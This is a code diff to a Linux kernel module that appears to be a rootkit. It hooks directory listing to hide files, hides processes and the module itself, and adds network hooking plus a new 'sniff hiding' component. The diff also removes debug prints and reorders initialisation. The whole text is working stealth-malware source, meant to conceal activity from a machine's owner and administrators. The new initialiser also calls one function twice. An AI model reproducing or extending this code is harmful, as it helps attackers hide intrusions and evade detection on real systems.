@@ -9,6 +9,7 @@
 #include <linux/slab.h>
 
 #include "headers/networking.h"
+#include "headers/sockets.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yanay Goor");
@@ -249,7 +250,6 @@ static int new_actor(struct dir_context *ctx, const char *name, int namelen, lof
 
 	list_for_each_entry(entry, &hooked_dir_context_list, head) {
 	    if (entry->ctx == ctx) {
-	    	printk(KERN_INFO "Called hooked actor! %s", name);
 	        list_for_each_entry(hidden_file, &hidden_files, head) {
                 if (hidden_file->ino == entry->ino && !strcmp(name, hidden_file->file_name)) {
                     return 0;
@@ -261,7 +261,6 @@ static int new_actor(struct dir_context *ctx, const char *name, int namelen, lof
                         return 0;
                     }
                 }
-	            printk(KERN_INFO "Called proc iterate!");
 	        }
 	        return entry->prev_actor(ctx, name, namelen, off, ino, type);
 	    }
@@ -388,20 +387,19 @@ int unhide_file(const char *path_name) {
 }
 
 void MRK_exit(void) {
+	sniff_hiding_exit();
     MRK_exit_nethook();
     unhide_module();
-	printk(KERN_INFO "Goodbye, World!\n");
 }
 
 static int __init MRK_initialize(void) {
-    MRK_init_nethook();
-    init_hidden_processes();
-	hide_file(test_path_name);
-	hide_file(test_path_name2);
-	unhide_file(test_path_name2);
-    hide_process("/bin/ps");
+	int err;
+
 	hide_module();
-	printk(KERN_INFO "Hello, World!\n");
+	if ((err = MRK_init_nethook())) return err;
+	if ((err = sniff_hiding_init())) return err;
+	if ((err = init_hidden_processes())) return err;
+    init_hidden_processes();
 	return 0;
 }
 
